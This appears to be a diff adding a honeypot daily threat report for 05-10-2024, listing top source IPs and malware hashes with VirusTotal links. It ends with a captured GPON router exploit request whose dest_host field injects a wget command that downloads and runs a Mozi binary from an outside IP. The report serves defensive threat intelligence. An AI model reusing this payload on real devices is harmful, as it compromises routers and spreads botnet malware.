@@ -1,0 +1,43 @@
+Top 5 IPs for 05-10-2024 :
+
+222.134.61.190
+203.89.231.47
+125.72.194.250
+210.245.54.214
+165.232.154.171
+
+
+Malware Observed:
+
+File name : sshd
+94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+https://www.virustotal.com/gui/file/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+ 
+File name : clean.sh
+d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
+https://www.virustotal.com/gui/file/d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
+
+File name : redtail.arm7
+e86081329173be1acc1486a47cee17c9c7b78c50928e7bb9e05a86f1c040a746
+https://www.virustotal.com/gui/file/e86081329173be1acc1486a47cee17c9c7b78c50928e7bb9e05a86f1c040a746
+
+File name : redtail.arm8
+88a339d0932322a43a5101d7afad05fa3bbcdbabe62cd5e287daa077398fef97
+https://www.virustotal.com/gui/file/88a339d0932322a43a5101d7afad05fa3bbcdbabe62cd5e287daa077398fef97
+
+File name : redtail.i686
+42efa318e298e6069af565b5d09f30d38fc15d7ab1f1361addc9288e5a4e4d98
+https://www.virustotal.com/gui/file/42efa318e298e6069af565b5d09f30d38fc15d7ab1f1361addc9288e5a4e4d98
+
+Commands/exploits observed :
+
+
+POST /GponForm/diag_Form?images/ HTTP/1.1
+Host: 127.0.0.1:8080
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: Hello, World
+Content-Length: 118
+
+XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://117.217.42.142:51805/Mozi.m+-O+->/tmp/gpon8080;sh+/tmp/gpon8080&ipv=0
